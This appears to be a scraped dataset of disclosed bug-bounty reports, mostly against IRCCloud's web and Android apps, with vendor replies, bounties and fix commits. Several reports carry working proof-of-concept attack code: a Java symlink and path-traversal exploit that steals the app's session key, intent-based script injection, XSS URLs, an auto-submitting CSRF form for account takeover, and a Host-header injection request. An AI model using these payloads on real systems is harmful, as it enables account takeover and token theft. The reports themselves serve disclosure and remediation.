15            <meta-data android:name=""android.service.chooser.chooser_target_service"" android:value="".ConversationChooserTargetService""/>
16        </activity>
Code 491 BytesWrap lines Copy Download1    protected void onResume() {
2        //...
3        if (getSharedPreferences(""prefs"", 0).getString(""session_key"", """").length() > 0) {
4            	//...
5                this.mUri = (Uri) getIntent().getParcelableExtra(""android.intent.extra.STREAM""); // getting attacker provided uri
6                if (this.mUri != null) {
7                    this.mUri = MainActivity.makeTempCopy(this.mUri, this); // copying file from this uri to /data/data/com.irccloud.android/cache/
8                }
Code 795 BytesWrap lines Copy Download1    public static Uri makeTempCopy(Uri fileUri, Context context, String original_filename) { // original_filename = mUri.getLastPathSegment()
2        //...
3        try {
4            Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));
5            Log.d(""IRCCloud"", ""Copying file to "" + out);
6            InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);
7            OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);
8            byte[] buffer = new byte[8192];
9            while (true) {
10                int len = is.read(buffer);
11                if (len != -1) {
12                    os.write(buffer, 0, len);
13                //...
It means that the specified file will be copied to /data/data/com.irccloud.android/cache/ with original name. Original name is getLastPathSegment() from the specified uri. But there is one thing: this method decodes last path segment. This is my PoC:
Code 1.75 KiBWrap lines Copy Download1    @Override
2    protected void onCreate(Bundle savedInstanceState) {
3        super.onCreate(savedInstanceState);
4        setContentView(R.layout.activity_main);
5
6        // path to sdcard (encoded relative path from ""/data/data/com.irccloud.android/cache/"")
7        String zhk = ""..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml"";
8        // absolute path to a file, pointing to sumlink
9        String appDir = ""/data/data/"" + getPackageName();
10        String deepPath = appDir + ""/x/x/x/x/"";
11
12        new File(deepPath).mkdirs();
13
14        String sumlink = deepPath + zhk;
15        try {
16            File sumlinkFile = new File(Uri.decode(sumlink)).getCanonicalFile();
17            sumlinkFile.getParentFile().mkdirs();
18
19            Runtime.getRuntime().exec(""ln -s /data/data/com.irccloud.android/shared_prefs/prefs.xml ""
20                    + sumlinkFile.getAbsolutePath()).waitFor();
21        }
22        catch(Exception e) {
23            // should be never thrown
24            throw new RuntimeException(e);
25        }
26        grant777PermissionToEverything(new File(appDir));
27
28        Uri uri = Uri.parse(""file://"" + sumlink); // file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml
29
30        Intent intent = new Intent();
31        intent.setClassName(""com.irccloud.android"", ""com.irccloud.android.activity.ShareChooserActivity"");
32        intent.putExtra(""android.intent.extra.STREAM"", uri);
33        startActivity(intent);
34    }
35
36    private void grant777PermissionToEverything(File dist) {
37        dist.setReadable(true, false);
38        dist.setWritable(true, false);
39        dist.setExecutable(true, false);
40        if(dist.isDirectory()) {
41            for(File child : dist.listFiles()) {
42                grant777PermissionToEverything(child);
43            }
44        }
45    }
Result:
Image F238129: Screenshot_2017-11-09-23-21-21.png 328.80 KiBZoom in Zoom out Copy Download
Image F238128: Screenshot_2017-11-09-23-21-29.png 251.62 KiBZoom in Zoom out Copy Download
It works so:
1) I start your activity with the following uri: file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml
2) Canonical file from #2 (/data/data/com.attacker/sdcard/prefs.xml) is a symlink file pointing to the file I want to theft (/data/data/com.irccloud.android/shared_prefs/prefs.xml)
3) In your app original_filename is equal to ../../../../sdcard/prefs.xml
4) 
Code 121 BytesWrap lines Copy Download1InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);
But openInputStream(...) automatically decodes the specified uri. So it will access my symlink file which points to /data/data/com.irccloud.android/shared_prefs/prefs.xml
5) 
Code 195 BytesWrap lines Copy Download1Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));
2OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);
It is equal to 
Code 107 BytesWrap lines Copy Download1Uri out = Uri.fromFile(new File(""/data/data/com.irccloud.android/cache/"", ""../../../../sdcard/prefs.xml""));
So it simply outputs the specified file to Sd card.
How to fix#
Just specify e.g. current timestamp as a file name, but don't use provided by attacker. In current implementation attacker can force IRC Cloud app to copy arbitrary files to arbitrary directories. File /data/data/com.irccloud.android/shared_prefs/prefs.xml contains session_key. In normal situation this file is accessible only to IRC Cloud app. But when it's copied to e.g. Sd card it will be accessible to everyone. But Sd card is only simple example. Attacker can also force IRC Cloud app to copy a file to its internal directory.
BTW this vulnerability also allows to overwrite arbitrary files. So attacker also can replace any your protected files and substitute for example history.2 attachments:F238128: Screenshot_2017-11-09-23-21-29.pngF238129: Screenshot_2017-11-09-23-21-21.pngbagipro   posted a comment. Nov 10th (5 years ago)Forgot to attach PoC APK in the previous message1 attachment:F238346: app-release.apkjwheare IRCCloud staff  changed the status to Triaged. Nov 10th (5 years ago)Thanks for the report. We'll look into this.jwheare IRCCloud staff  changed the status to Needs more info. Nov 15th (5 years ago)Hi there,
This should be fixed in the latest version of the app (4.4) and this commit https://github.com/irccloud/android/commit/b1e40bb603fe861290558b979d0972b92c22b908
Can you please confirm?jwheare IRCCloud staff  changed the status to Triaged. Nov 15th (5 years ago)IRCCloud  rewarded bagipro with a $500 bounty. Nov 15th (5 years ago)bagipro   posted a comment. Updated Nov 15th (5 years ago)Hi, I believe it's fixed, attacker has no ability anymore to use path traversal to specify output directory.
https://github.com/irccloud/android/blob/master/src/com/irccloud/android/activity/MainActivity.java#L3710
This check (and similar too) does nothing, because it should get canonical path, but no absolute. It can be bypassed like so:
Code 34 BytesWrap lines Copy Download1/data/data/./com.irccloud.android/
(and even if you change to canonical path, it can be bypassed via symlinks)
But it doesn't matter, because all slashes are replaced
https://github.com/irccloud/android/blob/master/src/com/irccloud/android/activity/MainActivity.java#L3737
Let's disclose my King Zaheck! ;)jwheare IRCCloud staff  closed the report and changed the status to Resolved. Nov 15th (5 years ago)Thanks very much.jwheare IRCCloud staff  requested to disclose this report. Nov 15th (5 years ago)bagipro   posted a comment. Nov 15th (5 years ago)Can you please update title from Theft or to Theft of? It's a typojwheare IRCCloud staff  changed the report title from [IRCCloud Android] Theft or arbitrary files leading to token leakage to [IRCCloud Android] Theft of arbitrary files leading to token leakage. Nov 15th (5 years ago)bagipro   agreed to disclose this report. Nov 15th (5 years ago)  This report has been disclosed. Nov 15th (5 years ago)bagipro   posted a comment. Apr 11th (5 years ago)@jwheare
I would suggest to add more protections. Attacker still able to upload protected files to public chats where they are available for everyone. Please validate the given uri and don't run
Code 122 BytesWrap lines Copy Download1 InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);
until you're sure the canonical file and all symlinks are not pointing to your internal files (or simply disallow use of symlinks, because normal apps don't use them)jwheare IRCCloud staff  posted a comment. Apr 11th (5 years ago)How does this change seem to you? https://github.com/irccloud/android/commit/4eb1facf3101312e3ed5856318ba6169be8c1322bagipro   posted a comment. Updated Apr 11th (5 years ago)@jwheare
Seems a good whitelist for /data/data/com.irccloud.android/cache/*. Thanks!",https://hackerone.com/reports/288955,England,United Kingdom,London,2017,11,9,20,52
IRCCloud,11-50,0.0,under-1m,$150.00,Medium,5.45,None,[IRCCloud Android] XSS in ImageViewerActivity,"bagipro  submitted a report to IRCCloud.Oct 26th (5 years ago)Hi, I'd like to report HTML/JS injection in activity com.irccloud.android.activity.ImageViewerActivity which is exported:
Code 941 BytesWrap lines Copy Download1        <activity android:configChanges=""keyboardHidden|orientation|screenSize"" android:label=""@string/title_activity_imageviewer"" android:name=""com.irccloud.android.activity.ImageViewerActivity"" android:theme=""@style/ImageViewerTheme"">
2            <intent-filter>
3                <action android:name=""android.intent.action.VIEW""/>
4                <category android:name=""android.intent.category.DEFAULT""/>
5                <category android:name=""android.intent.category.BROWSABLE""/>
6                <data android:scheme=""@string/IMAGE_SCHEME""/>
7            </intent-filter>
8            <intent-filter>
9                <action android:name=""android.intent.action.VIEW""/>
10                <category android:name=""android.intent.category.DEFAULT""/>
11                <category android:name=""android.intent.category.BROWSABLE""/>
12                <data android:scheme=""@string/IMAGE_SCHEME_SECURE""/>
13            </intent-filter>
14        </activity>
so can be launched by arbitrary apps installed on the same device. On the newest Androids could be exploited also by Android Instant Apps directly from a web-browser (installation is not required).
File com/irccloud/android/activity/ImageViewerActivity.java 
Code 757 BytesWrap lines Copy Download1
2        } else if (getIntent() == null || getIntent().getDataString() == null) {
3            finish();
4        } else {
5            ImageList.getInstance().fetchImageInfo(getIntent().getDataString().replace(getResources().getString(R.string.IMAGE_SCHEME), ""http""), new OnImageInfoListener() {
6                public void onImageInfo(ImageURLInfo info) {
7                    if (info == null) {
8                        ImageViewerActivity.this.fail();
9                    } else if (info.mp4 != null) {
10                        ImageViewerActivity.this.loadVideo(info.mp4);
11                    } else {
12                        ImageViewerActivity.this.loadImage(info.thumbnail); // by default
13                    }
14                }
15            });
16        }
Here we see that method ImageList.fetchImageInfo(..) is being loaded with attacker provided data.
Inside ImageList:
Code 305 BytesWrap lines Copy Download1    public void fetchImageInfo(String URL, OnImageInfoListener listener) {
2        // ...
3        String url = URL;
4        // ...
5        ImageURLInfo info = new ImageURLInfo();
6        info.thumbnail = url;
7        info.original_url = URL;
8        putImageInfo(info);
9        listener.onImageInfo(info);
So both info.thumbnail and info.original_url contains attacker provided data and this stuff is returned back to ImageViewerActivity where code is executed
Code 51 BytesWrap lines Copy Download1ImageViewerActivity.this.loadImage(info.thumbnail);
Inside this method attacker can inject arbitrary HTML/JS:
Code 495 BytesWrap lines Copy Download1private void loadImage(String urlStr) {
2        try {
3            // ...
4            this.mImage.loadDataWithBaseURL(null, ""<!DOCTYPE html>\n<html><head><style>html, body, table { height: 100%; width: 100%; background-color: #000;}</style></head>\n<body>\n<table><tr><td><img src='"" + new URL(urlStr).toString() + ""' width='100%' onerror='Android.imageFailed()' onclick='Android.imageClicked()' style='background-color: #fff;'/>\n</td></tr></table></body>\n</html>"", ""text/html"", ""UTF-8"", null);
PoC of exploitation on Java:
Code 323 BytesWrap lines Copy Download1        Intent intent = new Intent();
2        intent.setClassName(""com.irccloud.android"", ""com.irccloud.android.activity.ImageViewerActivity"");
3        intent.setData(Uri.parse(""https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg' onload='window.location.href=\""http://yahoo.com\""""));
4        startActivity(intent);
Result:
Image F233010: 2017-10-26_15-15-58.jpg 33.68 KiBZoom in Zoom out Copy Download
Image F233011: 2017-10-26_15-15-26.jpg 218.23 KiBZoom in Zoom out Copy Download
APK is attached3 attachments:F233010: 2017-10-26_15-15-58.jpgF233011: 2017-10-26_15-15-26.jpgF233012: app-release.apkjwheare IRCCloud staff  closed the report and changed the status to Resolved. Oct 26th (5 years ago)Thanks for this report. We've prevented this view from being exported and will be adding further escaping to protect against injection attacks.
https://github.com/irccloud/android/commit/8ff145519bcd30da1898dd54a68629f53c62afe7IRCCloud  rewarded bagipro with a $150 bounty. Oct 26th (5 years ago)IRCCloud  rewarded bagipro with a $350 bounty. Oct 26th (5 years ago)bagipro   posted a comment. Oct 26th (5 years ago)Cool, thanks. Can we disclose?bagipro   requested to disclose this report. Oct 26th (5 years ago)bagipro   posted a comment. Updated Nov 2nd (5 years ago)@jwheare Hi. Could you please agree to disclose it? I've found the same issue, and I need to give a referencejwheare IRCCloud staff  agreed to disclose this report. Nov 3rd (5 years ago)  This report has been disclosed. Nov 3rd (5 years ago)",https://hackerone.com/reports/283063,England,United Kingdom,London,2017,10,26,12,18
IRCCloud,11-50,0.0,under-1m,$100.00,No value,0.0,Violation of Secure Design Principles,Bruteforcing irccloud login,"techintheprovince  submitted a report to IRCCloud.Apr 10th (9 years ago)There is no mitigation, defenses in anyway or a lockout mechanism in the login page. A malicious minded user can continually tries to brute force an account password.
I have tried to input 20 incorrect password and I have not been lockout, tried the corrct password in the 21st time and it login successfully.
Kindly take a look sir. kindly also let me know if you needed more information.
Clifford",https://hackerone.com/reports/6883,England,United Kingdom,London,2014,4,10,21,41
IRCCloud,11-50,0.0,under-1m,$100.00,No value,0.0,Improper Authentication - Generic,Bug in iOS application which could lead to unauthorised access.,"uname  submitted a report to IRCCloud.Apr 11th (9 years ago)Hi,
The file under the Preferences folder within the iOS application stores sensitive information: com.irccloud.IRCCloud.plist. This file stores the user's authenticated session identifier. Stealing this information would allow unauthorised access to a user's account.
The content of the file can be seen in the file attached to this report.
This file is accessible from the phone even while the phone is locked with a passcode suggesting that the application does not secure the file using the appropriate data protection class.
This can also be verified by using the tool available at the following link:
https://github.com/ciso/ios-dataprotection/
If a user is logged into the application, all that an attacker needs to do is surreptitiously take the phone and dump the file within the folder. This would work while the phone is locked and does not require the phone to be jailbroken.
I should also mention that I haven't looked through all the files, but any sensitive file with the Protection class set to anything other than NSFileProtectionComplete would be extractable from the iPhone without requiring the passcode.
If you would like to test this, you can use the ios-data protection tool mentioned above or extract the data with iExplorer (Demo version) while the phone is locked and the user logged in.
More information regarding data protection is available here:
https://developer.apple.com/library/ios/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/AdvancedAppTricks/AdvancedAppTricks.html#//apple_ref/doc/uid/TP40007072-CH7-SW241 attachment:F6179: iOS-unauthorised_access.png",https://hackerone.com/reports/7036,England,United Kingdom,London,2014,4,11,4,48
IRCCloud,11-50,0.0,under-1m,$500.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Cross Site Scripting(XSS) on IRCCloud Badges Page (using Parameter Pollution),"rohitdua  submitted a report to IRCCloud.Jul 8th (6 years ago)I. Vulnerability
IRCCloud is affected by Cross Site Scripting vulnerability in its badges page. (www.irccloud.com/badges)
II. Description
IRCCloud is open to parameter pollution attacks ie. a parameter passed more than once with different values results in varying different results.
This bug is used to leverage an XSS in the badges page.
POC link:
Code 109 BytesWrap lines Copy Download1www.irccloud.com/badges?hostname=hostname"" type=""text/javascript""> /*&hostname=*/alert('XSS\n-Rohit Dua'); //
If  you visit the link a javascript pops up showing the message 'XSS - Rohit Dua'. (screenshot_irccloud.png)
Even after parameter pollution, the attack is ineffective due to strong XSS filters(possibly firewall)
The filter evasion is possible due a certain combination of javascript comments in the url that combine and comment out the unneeded part.
[Attached]
POC source code screenshot
POC alert box screenshot
Please verify and fix the same.2 attachments:F103965: irccloud.pngF103966: screenshot_irccloud.pngjwheare IRCCloud staff  changed the status to Triaged. Jul 8th (6 years ago)Thanks very much for this report. We've fixed the multiple parameter vulnerability and our XSS filtering should be working properly again. Please confirm the fix from your end.rohitdua   posted a comment. Jul 8th (6 years ago)It seems to be fixed. No more XSS there.jwheare IRCCloud staff  closed the report and changed the status to Resolved. Jul 8th (6 years ago)Thanks again for the report.IRCCloud  rewarded rohitdua with a $500 bounty. Jul 8th (6 years ago)rohitdua   posted a comment. Jul 8th (6 years ago)Thank you for the reward.
Will see you with more bugs.(if any)rohitdua   requested to disclose this report. Jul 8th (6 years ago)jwheare IRCCloud staff  agreed to disclose this report. Jul 8th (6 years ago)  This report has been disclosed. Jul 8th (6 years ago)rohitdua   posted a comment. Updated Jul 19th (6 years ago).",https://hackerone.com/reports/150083,England,United Kingdom,London,2016,7,8,19,55
IRCCloud,11-50,0.0,under-1m,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Dangerous Persistent xss,"reporter  submitted a report to IRCCloud.Apr 13th (9 years ago)If a person is an op in a channel, it is possible to make all the users inside the irc channel execute javascript code.
Steps to repoduce:
1.Go to a random channel where you are op.
2.Enter the following command:
/ban <script>alert(2)</script>
3.The script will execute an alert box containing 2 in all the browsers of the users inside the irc channel.",https://hackerone.com/reports/7441,England,United Kingdom,London,2014,4,13,10,2
IRCCloud,11-50,0.0,under-1m,$50.00,No value,0.0,Memory Corruption - Generic,"Exposed, outdated nginx server (v1.4.6) potentially vulnerable to heap-based buffer overflow & RCE","cha5m  submitted a report to IRCCloud.Sep 15th (6 years ago)Summary
During my reconnaissance for your bug bounty program, I discovered an instance of nginx version 1.4.6 running at the IP address https://54.153.101.52. To locate it, I search for IRCCloud-related certificated and found the self-signed certificate for this server (https://censys.io/ipv4/54.153.101.52). This version is in the range of nginx versions affected by the CVE, CVE-2014-0133. There is a known exploit for this CVE. According to MITRE, this ""heap-based buffer overflow in the SPDY implementation in nginx 1.3.15 before 1.4.7 and 1.5.x before 1.5.12 allows remote attackers to execute arbitrary code via a crafted request.""
Image F120380: Screenshot_2016-09-15_00.01.28.png 34.16 KiBZoom in Zoom out Copy Download
However, to succeed, I believe that the exploit requires the ngx_http_spdy_module module (which is not compiled by default) and it requires no --with-debug configure option, if the ""spdy"" option of the ""listen"" directive is used in a configuration file. Because I am unable to check the configuration of your server, I wanted to inform you of this outdated version.
Checking for Vulnerability Steps

Log into server located at 54.153.101.52
Check the nginx configuration file. This should provide you with information as to whether or not it is vulnerable.

Mitigation
Regardless, this is a very outdated version of nginx that should likely be updated to the most recent version if you intend to keep if publicly-exposed. This would correct the vulnerability (if it is vulnerable). Alternatively, if you only want to correct the vulnerability, you can use the patch below:
Code 412 BytesWrap lines Copy Download1--- src/http/ngx_http_spdy.c
2+++ src/http/ngx_http_spdy.c
3@@ -1849,7 +1849,7 @@ static u_char *
4 ngx_http_spdy_state_save(ngx_http_spdy_connection_t *sc,
5     u_char *pos, u_char *end, ngx_http_spdy_handler_pt handler)
6 {
7-#if (NGX_DEBUG)
8+#if 1
9     if (end - pos > NGX_SPDY_STATE_BUFFER_SIZE) {
10         ngx_log_error(NGX_LOG_ALERT, sc->connection->log, 0,
11                       ""spdy state buffer overflow: ""
Source: https://nginx.org/download/patch.2014.spdy2.txt
Best,
@n0rb3r71 attachment:F120380: Screenshot_2016-09-15_00.01.28.pngrussss IRCCloud staff  closed the report and changed the status to Resolved. Sep 15th (6 years ago)Thanks for your report! We were not accepting SPDY connections on that machine (and I suspect even if we were, it would have not been possible to exploit this issue without a valid client certificate), however it should have been running the most recent nginx, so this was an issue with our config management.IRCCloud  rewarded cha5m with a $50 bounty. Sep 15th (6 years ago)
    
    
        
            
                
                
                
            
        
    
cha5m   posted a comment. Sep 15th (6 years ago)@russss, thank you for the bounty and quick resolution! :)cha5m   requested to disclose this report. Sep 15th (6 years ago)  This report has been disclosed. Oct 15th (6 years ago)",https://hackerone.com/reports/168485,England,United Kingdom,London,2016,9,15,4,8
IRCCloud,11-50,0.0,under-1m,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF),Full account takeover using CSRF and password reset,"melvin  submitted a report to IRCCloud.Apr 10th (9 years ago)An attacker could take over any user account by doing the following things.
1) Exploit a CSRF vulnerability in /chat/user-settings.  An attacker creates a webpage on a (non-IRCCloud) website (for example: http://example.com/cat.html) and inserts a (hidden) form like this:
Code 527 BytesWrap lines Copy Download1    <form action=""https://www.irccloud.com/chat/user-settings"" method=""post"">
2    <input type=""hidden"" name=""email"" value=""hacker@example.com"">
3    <input type=""hidden"" name=""realname"" value=""Doesn't Matter"">
4    <input type=""hidden"" name=""hwords"" value="""">
5    <input type=""hidden"" name=""autoaway"" value=""1"">
6    <input type=""hidden"" name=""reqid"" value=""1"">
7    <input type=""hidden"" name=""session"" value="""">
8    <input type=""submit""> 
9    <!-- some code to make the form submit automatically, in the  background-->
10    </form>
2) The attacker will send a link to the page to the victim. When the victim is logged in to IRCCloud, and clicks the link to the page, the e-mail of the victim on IRCCloud will be updated (in the background) to hacker@example.com.
3) The attacker will receive an e-mail to confirm the e-mail address (see: mail.png).
4) The attacker can now use the password reset functionality to change the password of the victim's account and gain full control over the account.",https://hackerone.com/reports/6910,England,United Kingdom,London,2014,4,10,23,5
IRCCloud,11-50,0.0,under-1m,$100.00,No value,0.0,Violation of Secure Design Principles,Host Header Injection - irccloud.com,"ethicalhacker  submitted a report to IRCCloud.May 25th (8 years ago)Host Header Injection Attack - irccloud.com
An attacker can manipulate the Host header as seen by the web application and cause the application to behave in unexpected ways.
Very often multiple websites are hosted on the same IP address. This is where the Host Header comes in. This header specifies which website should process the HTTP request. The web server uses the value of this header to dispatch the request to the specified website. Each website hosted on the same IP address is called a virtual host.
But what happens if we specify an invalid Host Header? If Apache receives an unrecognized Host Header, it passes it to the first virtual host defined in httpd.conf. Therefore, it's possible to send requests with arbitrary Host Headers to the first virtual host. 
Another way to pass arbitrary Host headers is to use the X-Forwarded-Host Header. In some configurations this header will rewrite the value of the Host header. Therefore it's possible to make a request like:
PoC Request -
GET / HTTP/1.1
Host: google.com
Host: www.irccloud.com
Proxy-Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
PoC Response -
HTTP/1.1 301 Moved Permanently
Content-length: 0
Location: https://google.com/
Connection: close
PoC Payload -
Host: google.com
Host: anymalicioussite.com
PoC pcap -
Enclosed
PoC Screenshot -
Enclosed 
Please verify and fix the same.1 attachment:F9684: irccloud-host-header.jpg",https://hackerone.com/reports/13286,England,United Kingdom,London,2014,5,25,10,41
IRCCloud,11-50,0.0,under-1m,$100.00,No value,0.0,Violation of Secure Design Principles,Host Header is not validated resulting in Open Redirect,"anshuman_bh  submitted a report to IRCCloud.Apr 12th (9 years ago)Please see the attached screenshot where I am sending a request to irccloud.com with an invalid HOST header and I am getting redirected to that domain. This is because the HOST header is not validated to ensure that the request is originating from that target host or not.
http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html http://carlos.bueno.org/2008/06/host-header-injection.html
The above links mention 2 different ways to exploit this issue:

web-cache poisoning and/or 
Using alternate channels like password reset emails. 

For the first way, it can be exploited by poisoning a cache with the attacker's domain and then serving that poisoned response to legitimate users, causing them to redirect to the attacker's domain. This attack kind of varies depending on different web servers as they interpret duplicate Host headers in different ways. The attack vectors are very well explained in the above blogs so I don't want to re-iterate them here again. 
For the second way, I verified that the password reset functionality on the IRC Cloud website does not retrieve the Host header when sending emails. But, validating the Host header is always a good practice. 1 attachment:F6325: Screen_Shot_2014-04-12_at_12.40.02_PM.png",https://hackerone.com/reports/7357,England,United Kingdom,London,2014,4,12,16,54
IRCCloud,11-50,0.0,under-1m,$200.00,High,7.95,Insecure Direct Object Reference (IDOR),IDOR with Geolocation data not stripped from images,"do_some_hack  submitted a report to IRCCloud.Jun 24th (2 years ago)Vulnerable URL :-   https://usercontent.irccloud-cdn.com/file/0wXMTrPu/hgjbk
Vulnerability Discription:
When an image is taken using a smartphone or camera certain metadata fields are often attached to it. These fields could include the model of the camera, the time it was taken, whether the flash was used, the shutter speed, focal length, light value and even the location. In Inturn, while uploading the image as a profile picture, the exif data is not stripped from images. The exif data in images contains sensitive data like Geoloacation, latitude, longitude, etc. Also it contains the camera information and other details. 
And your website vulnerable to image IDOR which allows attacker to see other users images and retrive data using tool.
Tools Used: exiftool.
Steps TO reproduce:
Use  2 accounts in two browser
Download images from here 
https://github.com/ianare/exif-samples/tree/master/jpg/gps
1)In 1st account in network user can upload files just upload the image their and open image link in new tab.
 new tab that image url like
https://usercontent.irccloud-cdn.com/file/0wXMTrPu/hgjbk
2)In second account do same things and that url like down 
https://usercontent.irccloud-cdn.com/file/ZUsZU7az/3.jpg
3) Change 1st account Url parameter value to 2nd acoount Url parameter(see poc for it).
4) now image will shows up copy that url again and paste it to image data retrival website
http://exif.regex.info/exif.cgi
5) and see sensitive data   exposed.
Impact
1) By this the attacker tracks your location and use it for personal things.
2) Sensitive data exposed.1 attachment:F881191: 2020-06-24_08-17-01.mkv",https://hackerone.com/reports/906907,England,United Kingdom,London,2020,6,24,15,26
IRCCloud,11-50,0.0,under-1m,$100.00,No value,0.0,Cross-Site Request Forgery (CSRF),Sign up CSRF,"techintheprovince  submitted a report to IRCCloud.Apr 10th (9 years ago)Again sir,
There is no mitigation against CSRF attacks on the regsitration, I believe when not fixed you will be flooded with reports by researchers regarding this.
Code 987 BytesWrap lines Copy Download1<form action="""" method=""post"" class=""signupForm"" novalidate>
2                <p>Sign up for a free account / <b><a href=""/pricing"" target=""_blank"">Pricing</a></b></p>
3                <div class=""userError""></div>
4                <div id=""signupOrgInfo"" class=""userInfo"">You’re signing up to join the <b id=""signupOrgName""></b> team.</div>
5                <p class=""form""><input class=""input"" name=""realname"" placeholder=""Name""></p>
6                <p class=""form""><input class=""input"" name=""email"" type=""email"" placeholder=""Email""></p>
7                <p class=""form""><input class=""input"" name=""password"" type=""password"" placeholder=""Password""></p>
8                <input type=""hidden"" name=""invite"">
9                <input type=""hidden"" name=""org_invite"">
10                <p class=""form""><button type=""submit"" class=""signup""><span>Sign up</span></button></p>
11                <p><small>By signing up, you agree to our <a href=""/terms"">Terms of Service</a></small></p>
12            </form>
Kindly let me know if you needed more information.
Cliffordjwheare IRCCloud staff  closed the report and changed the status to Not Applicable. Apr 10th (9 years ago)This is the signup form, as such CSRF doesn't apply as a password is needed, you can't just rely on the cookierussss IRCCloud staff  reopened this report. Apr 11th (9 years ago)After reviewing this report we've determined that this is a valid issue and we're working on a fix.techintheprovince   posted a comment. Apr 12th (9 years ago)Thank you for reviewing this sir. 
Cliffordrussss IRCCloud staff  changed the status to Triaged. Apr 12th (9 years ago)russss IRCCloud staff  closed the report and changed the status to Resolved. Apr 14th (9 years ago)Many thanks for this report. We've now implemented a fix for this.IRCCloud  rewarded techintheprovince with a $100 bounty. Apr 14th (9 years ago)russss IRCCloud staff  agreed to disclose this report. Apr 14th (9 years ago)  This report has been disclosed. May 14th (9 years ago)",https://hackerone.com/reports/6872,England,United Kingdom,London,2014,4,10,21,24
IRCCloud,11-50,0.0,under-1m,$100.00,No value,0.0,Violation of Secure Design Principles,Leaking Referrer in Reset Password Link,"techintheprovince  submitted a report to IRCCloud.Apr 10th (9 years ago)I have found that you are leaking via the referrer the reset password link. I am attaching the photo as proof of concept that the site is indeed leaking the reset password link via the referrer.
Thats when someone loads the reset password link and decided to click on external links.
Its the time the referrer is leak ( see attached photo )
Clifford Trigotechintheprovince   posted a comment. Apr 10th (9 years ago)Here is the screenshot sir. Attached.1 attachment:F6140: Screenshot_4.jpgrussss IRCCloud staff  changed the status to Triaged. Apr 11th (9 years ago)Hi,
Thanks for your report! This does seem to be a genuine information leak, so we're taking a look at it now.techintheprovince   posted a comment. Apr 11th (9 years ago)Thank you sir. Noted.
Cliffordrussss IRCCloud staff  closed the report and changed the status to Resolved. Apr 11th (9 years ago)Thanks again for this report - we've now fixed this issue by removing the external links from this page.IRCCloud  rewarded techintheprovince with a $100 bounty. Apr 11th (9 years ago)russss IRCCloud staff  requested to disclose this report. Apr 11th (9 years ago)techintheprovince   agreed to disclose this report. Apr 12th (9 years ago)  This report has been disclosed. Apr 12th (9 years ago)Summary by techintheprovinceClicking on external links within the reset password page leaked password reset token in the referer header.",https://hackerone.com/reports/6884,England,United Kingdom,London,2014,4,10,21,46
Judge.me ,1-10,0.0,1m-10m,$500.00,Medium,6.8,Cross-site Scripting (XSS) - Stored,Stored XSS in Email Templates via link,"rioncool22  submitted a report to Judge.me .Oct 20th (about 1 year ago)Summary:
Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.
FYI:
I Install judge.me in Shopify E-Commerce
Steps To Reproduce:

Go to Requests > Email Templates

Image F1488407: Screenshot_194.png 9.01 KiBZoom in Zoom out Copy Download

Click New Templates

Image F1488408: Screenshot_195.png 7.90 KiBZoom in Zoom out Copy Download

Edit this block 

Image F1488410: Screenshot_196.png 75.09 KiBZoom in Zoom out Copy Download

Insert Link with XSS payload (See image below)

Image F1488413: Screenshot_197.png 17.59 KiBZoom in Zoom out Copy Download

Then save email
To trigger the XSS, you can click Click Here text

Image F1488415: Screenshot_198.png 33.33 KiBZoom in Zoom out Copy Download
Impact
Session Hijacking, Cookie Stealing5 attachments:F1488407: Screenshot_194.pngF1488408: Screenshot_195.pngF1488410: Screenshot_196.pngF1488413: Screenshot_197.pngF1488415: Screenshot_198.png",https://hackerone.com/reports/1376672,England,United Kingdom,London,2021,10,20,22,12
Kaspersky,1001-5000,0.0,200m-1b,$400.00,Critical,9.5,Use of a Key Past its Expiration Date,In App purchase Hack ,"huntman  submitted a report to Kaspersky.Apr 3rd (6 years ago)I have downloaded kaspersky internet security from the playstore and it asks for free version or trial version and i have given trial version then i got 7 days free pack,After that i used with the help of lucky patcher and freedom app i can able to byepass without money i can able to purchase 365 days pack ,Hope this will help ,I have attached screenshot here kindly check,I dint spend not even single $2 attachments:F173047: Before_Activation.jpegF173048: After_Activation.jpeg",https://hackerone.com/reports/218287,Moscow,Russia,Moscow,2017,4,3,12,29
Kaspersky,1001-5000,0.0,200m-1b,$300.00,Medium,5.45,Information Disclosure,Kaspersky Password Manager allows websites to access user's address data,"palant  submitted a report to Kaspersky.Oct 30th (4 years ago)Note: According to https://www.securityweek.com/kaspersky-adds-password-manager-bug-bounty-program and some other sources, Kaspersky Password Manager is in scope for this program. The program description doesn't reflect this however.
Summary
It is possible for websites to read out addresses that the user stores in Kaspersky Password Manager.
Description
Kaspersky Password Manager injects its user interface into untrusted web pages, there are no protections in place. This makes it easy for websites to instrument the user interface, e.g. to fill in addresses without the user's consent or knowledge.
Environment

Scope: Application
Product name: Kaspersky Password Manager, browser extensions installed
Product version: 9.0.1.447
OS name and version (incl SP): Windows 10 Version 1803
Attack type: Information Disclosure
Maximum user privileges needed to reproduce your issue: no privileges

Steps to reproduce

Make sure to unlock Kaspersky Password Manager and to add an address. The actual address part should be a single line (filling in fails for multiline values with my PoC which could certainly be addressed if necessary).
Download the attached extract_address.html and open it via any web server (localhost will do).
